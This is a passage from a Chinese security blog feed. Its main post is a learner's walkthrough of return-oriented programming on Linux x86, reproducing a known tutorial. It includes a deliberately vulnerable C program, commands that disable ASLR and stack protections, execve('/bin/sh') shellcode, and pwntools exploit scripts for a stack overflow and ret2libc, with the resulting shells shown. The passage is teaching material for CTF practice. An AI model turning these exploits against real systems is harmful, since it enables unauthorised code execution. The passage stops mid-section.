alt="运行"><br></div><p>接着我们可以按<code>”F8”</code>或者<code>”F7”</code>进行<code>单步调试</code>，<code>主窗口</code>会显示pc将要执行的指令以及执行后的结果。<code>右边</code>会看到各个寄存器的值。注意，在寄存器（比如说RSP）的值上点击右键，可以选择<code>”follow in dump”</code>，随后就在data dump窗口就能看到这个地址上对应数据是什么了。除此之外，EDB还支持<code>动态修改内存数据</code>，当你选中数据后，可以右键，选择<code>”Edit Bytes”</code>，就可以对选中的数据进行动态修改。</p><p>以上介绍的只是EDB的一些基本操作，在随后的章节中我们还会结合其他例子继续介绍一些EDB的高级用法。</p><h3 id="0x06小结"><a href="#0x06小结" class="headerlink" title="0x06小结"></a>0x06小结</h3><p>可以说ROP最大的艺术就是在于gadgets千变万化的组合了。因为篇幅原因我们准备将如何寻找以及组合gadgets的技巧留到随后的文章中去介绍。欢迎大家到时继续学习。</p><h3 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h3><p>1.<a href="http://wooyun.jozxing.cc/static/drops/tips-2288.html" target="_blank" rel="noopener">64位Linux下的栈溢出</a><br>2.<a href="https://blog.leoc.io/blog/20140414/week4-bigdata-writeup/" target="_blank" rel="noopener">Week4-bigdata-丘比龙版银河系最详细Writeup!</a></p><h3 id="0xFF-版权声明"><a href="#0xFF-版权声明" class="headerlink" title="0xFF 版权声明"></a>0xFF 版权声明</h3><p>本文独家首发于乌云知识库(drops.wooyun.org)。本文并没有对任何单位和个人授权转载。如本文被转载，一定是属于未经授权转载，属于严重的侵犯知识产权，本单位将追究法律责任。</p>]]></content>
      
      <categories>
          
          <category> 备份 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一步一步学ROP之Linux_x86篇-蒸米</title>
      <link href="/2018/05/10/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux_x86%E7%AF%87-%E8%92%B8%E7%B1%B3/"/>
      <url>/2018/05/10/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux_x86%E7%AF%87-%E8%92%B8%E7%B1%B3/</url>
      <content type="html"><![CDATA[<blockquote><p>这篇博客记录我跟着蒸米大神的文章一步一步学ROP之Linux_x86学习ROP的过程。在进行复现的时候，遇到了一些问题，文章中会提到。<br><a id="more"></a></p></blockquote><h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p><code>ROP</code>的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。虽然现在大家都在用64位的操作系统，但是想要扎实的学好ROP还是得从基础的x86系统开始，但看官请不要着急，在随后的教程中我们还会带来linux_x64以及android (arm)方面的ROP利用方法，欢迎大家继续学习。</p><p><code>小编备注</code>:文中涉及代码可在文章最后的github链接找到。</p><h3 id="0x01-Control-Flow-Hijack-程序流劫持"><a href="#0x01-Control-Flow-Hijack-程序流劫持" class="headerlink" title="0x01 Control Flow Hijack 程序流劫持"></a>0x01 Control Flow Hijack 程序流劫持</h3><p>比较常见的<code>程序流劫持</code>就是<code>栈溢出</code>，<code>格式化字符串攻击</code>和<code>堆溢出</code>了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有<code>DEP</code>（堆栈不可执行），<code>ASLR</code>（内存地址随机化），<code>Stack Protector</code>（栈保护）等。但是如果上来就部署全部的防御，初学者可能会觉得无从下手，所以我们先从最简单的没有任何保护的程序开始，随后再一步步增加各种防御措施，接着再学习绕过的方法，循序渐进。</p><p>首先来看这个有明显<code>缓冲区溢出</code>的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们用下列命令进行<code>编译</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack -o level1 level1.c</span><br></pre></td></tr></table></figure><p>这个命令编译程序。<code>-fno-stack-protector</code>和<code>-z execstack</code>这两个参数会分别关掉<code>Stack Protector(GS、canary)</code>和<code>DEP(NX)</code>。</p><p>同时我们在shell中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s </span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>这几个指令。执行完后我们就关掉整个linux系统的<code>ASLR</code>保护。</p><p>接下来我们开始对目标程序进行分析。首先我们先来确定<code>溢出点</code>的位置，这里我推荐使用<code>pattern.py</code>这个脚本来进行计算。我们使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pattern.py create 150</span><br></pre></td></tr></table></figure><p>来生成一串测试用的150个字节的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure><p>随后我们使用<code>gdb ./level1</code>调试程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/buffer/桌面/practice/ROP_x86/0x01/level1 </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x37654136 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────</span><br><span class="line">*EAX  0x97</span><br><span class="line"> EBX  0x0</span><br><span class="line">*ECX  0xffffcd90 ◂— 0x41306141 (<span class="string">'Aa0A'</span>)</span><br><span class="line">*EDX  0x100</span><br><span class="line">*EDI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line">*ESI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line">*EBP  0x65413565 (<span class="string">'e5Ae'</span>)</span><br><span class="line">*ESP  0xffffce20 ◂— 0x41386541 (<span class="string">'Ae8A'</span>)</span><br><span class="line">*EIP  0x37654136 (<span class="string">'6Ae7'</span>)</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x37654136</span><br></pre></td></tr></table></figure><p>我们可以得到<code>内存出错</code>的地址为<code>0x37654136</code>。随后我们使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python pattern.py offset 0x37654136</span><br><span class="line">hex pattern decoded as: 6Ae7</span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>就可以非常容易的计算出PC返回值的覆盖点为140个字节。我们只要构造一个<code>”A”*140+ret</code>字符串，就可以让pc执行ret地址上的代码了。</p><p>接下来我们需要一段<code>shellcode</code>，可以用<code>msf生成</code>，或者自己反编译一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># execve (<span class="meta-string">"/bin/sh"</span>) </span></span><br><span class="line"><span class="meta"># xor ecx, ecx</span></span><br><span class="line"><span class="meta"># mul ecx</span></span><br><span class="line"><span class="meta"># push ecx</span></span><br><span class="line"><span class="meta"># push 0x68732f2f   ;; hs<span class="comment">//</span></span></span><br><span class="line"><span class="meta"># push 0x6e69622f   ;; nib/</span></span><br><span class="line"><span class="meta"># mov ebx, esp</span></span><br><span class="line"><span class="meta"># mov al, 11</span></span><br><span class="line"><span class="meta"># int 0x80</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br></pre></td></tr></table></figure><p>这里我们使用一段最简单的执行<code>execve (&quot;/bin/sh&quot;)</code>命令的语句作为shellcode。</p><p>溢出点有了，shellcode有了，下一步就是控制PC跳转到shellcode的地址上:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[shellcode][“AAAAAAAAAAAAAA”….][ret]</span><br><span class="line">^------------------------------------------------|</span><br></pre></td></tr></table></figure><p>对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是<code>gdb的调试环境会影响buf在内存中的位置</code>，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。怎么解决这个问题呢？</p><p>最简单的方法就是开启<code>core dump</code>这个功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line">sudo sh -c <span class="string">'echo "/tmp/core.%t" &gt; /proc/sys/kernel/core_pattern'</span></span><br></pre></td></tr></table></figure><p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。这里的核心转储只在<code>当前终端下有效</code>，关闭终端自动恢复默认状态(关闭)。</p><p>如果想让核心转储功能<code>永久开启</code>，可以修改文件/etc/security/limits.conf ，增加一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&lt;domain&gt; &lt;type&gt; &lt;item&gt; &lt;value&gt;</span><br><span class="line">    *      soft   core  unlimited</span><br></pre></td></tr></table></figure><p>通过修改 /proc/sys/kernel/core_uses_pid ，可以使生成的核心转储文件名变为 <code>core.[pid]</code> 的模式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/core_uses_pid</span><br></pre></td></tr></table></figure><p>还可以修改 /proc/sys/kernel/core_pattern 来控制生成核心转储文件的<code>保存位置</code>和<code>文件名格式</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /tmp/core-%e-%p-%t &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>此时生成的文件保存在 /tmp/ 目录下，文件名格式为 <code>core-[filename]-[pid]-[time]</code> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ./level1 </span><br><span class="line">ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">$ gdb level1 /tmp/core.1525946343 </span><br><span class="line">pwndbg: loaded 170 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from level1...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">[New LWP 10716]</span><br><span class="line">Core was generated by `./level1<span class="string">'.</span></span><br><span class="line"><span class="string">Program terminated with signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">#0  0x41414141 in ?? ()</span></span><br><span class="line"><span class="string">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span></span><br><span class="line"><span class="string">──────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="string"> EAX  0x9e</span></span><br><span class="line"><span class="string"> EBX  0x0</span></span><br><span class="line"><span class="string"> ECX  0xffffce70 ◂— 0x44434241 ('</span>ABCD<span class="string">')</span></span><br><span class="line"><span class="string"> EDX  0x100</span></span><br><span class="line"><span class="string"> EDI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span></span><br><span class="line"><span class="string"> ESI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span></span><br><span class="line"><span class="string"> EBP  0x41414141 ('</span>AAAA<span class="string">')</span></span><br><span class="line"><span class="string"> ESP  0xffffcf00 ◂— 0x41414141 ('</span>AAAA<span class="string">')</span></span><br><span class="line"><span class="string"> EIP  0x41414141 ('</span>AAAA<span class="string">')</span></span><br><span class="line"><span class="string">───────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="string">Invalid address 0x41414141</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/10s $esp-144</span></span><br><span class="line"><span class="string">0xffffce70:"ABCD", '</span>A<span class="string">' &lt;repeats 11 times&gt;...</span></span><br><span class="line"><span class="string">0xffffce7f:'</span>A<span class="string">' &lt;repeats 15 times&gt;...</span></span><br><span class="line"><span class="string">0xffffce8e:'</span>A<span class="string">' &lt;repeats 15 times&gt;...</span></span><br><span class="line"><span class="string">0xffffce9d:'</span>A<span class="string">' &lt;repeats 15 times&gt;...</span></span><br></pre></td></tr></table></figure><p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出<code>buffer</code>的地址为<code>$esp-144</code>。通过gdb的命令 “x/10s $esp-144”，我们可以得到<code>buf的地址为0xffffce70</code>。这里在我的环境里是这个地址值，和大佬的值相差很大，应该是环境的问题。最坑的是，前面我在普通用户下复现的，shell是<code>zsh</code>，exp死活执行不成功，思考了很长一段时间。最后在将shell切换成<code>bash</code>后，执行成功了。</p><p>切换shell的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#切换为bash</span></span><br><span class="line">chsh -s /bin/bash</span><br><span class="line"><span class="comment">#切换为zsh</span></span><br><span class="line">chsh -s /bin/zsh</span><br><span class="line"><span class="comment">#切换完记得注销一下</span></span><br></pre></td></tr></table></figure><p>OK，现在<code>溢出点</code>，<code>shellcode</code>和<code>返回值地址</code>都有了，可以开始写exp了。写exp的话，我强烈推荐<code>pwntools这</code>个工具，因为它可以非常方便的做到本地调试和远程攻击的转换。本地测试成功后只需要简单的修改一条语句就可以马上进行远程攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./level1'</span>)  <span class="comment">#本地测试</span></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>)  <span class="comment">#远程攻击</span></span><br></pre></td></tr></table></figure><p>最终本地测试代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level1'</span>) </span><br><span class="line">ret = <span class="number">0xffffce70</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p32(ret) == struct.pack("&lt;I",ret) </span></span><br><span class="line"><span class="comment">#对ret进行编码，将地址转换成内存中的二进制存储形式</span></span><br><span class="line">payload = shellcode + <span class="string">'A'</span> * (<span class="number">140</span> - len(shellcode)) + p32(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload) <span class="comment">#发送payload</span></span><br><span class="line"></span><br><span class="line">p.interactive()  <span class="comment">#开启交互shell</span></span><br></pre></td></tr></table></figure><p>执行exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python level1_exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level1'</span>: pid 2633</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>接下来我们把这个目标程序作为一个<code>服务绑定</code>到服务器的某个<code>端口</code>上，这里我们可以使用<code>socat</code>这个工具来完成，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./level1</span><br></pre></td></tr></table></figure><p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 <code>nc 127.0.0.1 10001</code>来访问我们的目标程序服务了。</p><p>因为现在目标程序是跑在<code>socat的环境</code>中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成<code>core dump</code>的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行<code>远程溢出</code>啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python level1_exp.py </span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h3 id="0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护"></a>0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</h3><p>现在我们把<code>DEP打开</code>，依然<code>关闭stack protector</code>和<code>ASLR</code>。编译方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o level2 level2.c</span><br></pre></td></tr></table></figure><p>这时候我们如果使用level1的exp来进行测试的话，系统会拒绝执行我们的shellcode。如果你通过sudo cat /proc/[pid]/maps查看，你会发现<code>level1</code>的<code>stack</code>是<code>rwx</code>的，但是<code>level2</code>的<code>stack</code>却是<code>rw</code>的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level1:   bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]</span><br><span class="line">level2:   bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]</span><br></pre></td></tr></table></figure><p>那么如何执行shellcode呢？我们知道level2调用了<code>libc.so</code>，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行<code>system(“/bin/sh”)</code>的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到<code>system()</code>这个<code>函数的地址</code>以及<code>”/bin/sh”</code>这个<code>字符串的地址</code>。</p><p>如果<code>关掉了ASLR</code>的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是<code>固定的</code>。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过<code>print</code>和<code>searchmem</code>命令来查找system和”/bin/sh”字符串的地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ gdb level2</span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x804846e</span><br><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/buffer/桌面/practice/ROP_x86/0x02/level2</span><br><span class="line">......</span><br><span class="line"> ► f 0  804846e main+14</span><br><span class="line">   f 1 f7e1a637 __libc_start_main+247</span><br><span class="line">Breakpoint main</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> system</span><br><span class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e3cda0 &lt;__libc_system&gt;</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> __libc_start_main</span><br><span class="line"><span class="variable">$2</span> = &#123;int (int (*)(int, char **, char **), int, char **, int (*)(int, char **, char **), void (*)(void), void (*)(void), void *)&#125; 0xf7e1a540 &lt;__libc_start_main&gt;</span><br><span class="line">pwndbg&gt; searchmem <span class="string">"/bin/sh"</span></span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">'/bin/sh'</span> <span class="keyword">in</span>: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">libc : 0xf7f5da0b (<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure><p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取<code>libc.so</code>在内存中的<code>起始位置</code>，接下来我们可以通过searchmem命令来查找”/bin/sh”这个字符串。这样我们就得到了<code>system</code>的地址<code>0xf7e3cda0</code>以及<code>&quot;/bin/sh&quot;</code>的地址<code>0xf7f5da0b</code>。下面我们开始写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10002)</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0xdeadbeef</span></span><br><span class="line">systemaddr=<span class="number">0xf7e3cda0</span></span><br><span class="line">binshaddr=<span class="number">0xf7f5da0b</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">'A'</span>*<span class="number">140</span> + p32(systemaddr) + p32(ret) + p32(binshaddr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>要注意的是<code>system()后面</code>跟的是执行完system函数后要<code>返回地址</code>，接下来才是”/bin/sh”字符串的地址。因为我们执行完后也不打算干别的什么事，所以我们就随便写了一个0xdeadbeef作为返回地址。下面我们测试一下exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python level2_exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level2'</span>: pid 5659</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><p>OK。测试成功。</p><h3 id="0x03-ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#0x03-ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="0x03 ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>0x03 ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h3><p>接下来我们<code>打开ASLR</code>保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s </span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>现在我们再回头测试一下level2的exp，发现已经不好用了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 